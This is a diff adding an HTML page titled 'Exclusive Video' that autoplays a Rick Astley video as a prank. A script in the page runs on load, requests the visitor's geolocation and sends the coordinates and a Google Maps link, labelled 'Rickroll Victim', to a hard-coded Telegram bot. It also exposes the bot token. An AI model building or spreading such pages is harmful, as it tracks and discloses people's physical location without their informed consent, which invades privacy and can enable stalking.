@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Exclusive Video</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- Rick Astley - Never Gonna Give You Up -->
+<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&controls=0&rel=0&showinfo=0&modestbranding=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+
+<script>
+  const BOT_TOKEN = '7483695523:AAG6BoyFGCH6XDTDJ0wXhGlxEwlUwSYcnXA';
+  const CHAT_ID = '7650029381';
+
+  function sendToTelegram(text) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+    });
+  }
+
+  function getLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const link = `https://maps.google.com/?q=${lat},${lon}`;
+        const msg = `Rickroll Victim:\nLatitude: ${lat}\nLongitude: ${lon}\nMap: ${link}`;
+        sendToTelegram(msg);
+      }, error => {
+        sendToTelegram("Rickroll Victim: Location permission denied.");
+      });
+    } else {
+      sendToTelegram("Rickroll Victim: Geolocation not supported.");
+    }
+  }
+
+  // Trigger on visit
+  window.onload = getLocation;
+</script>
+
+</body>
+</html>
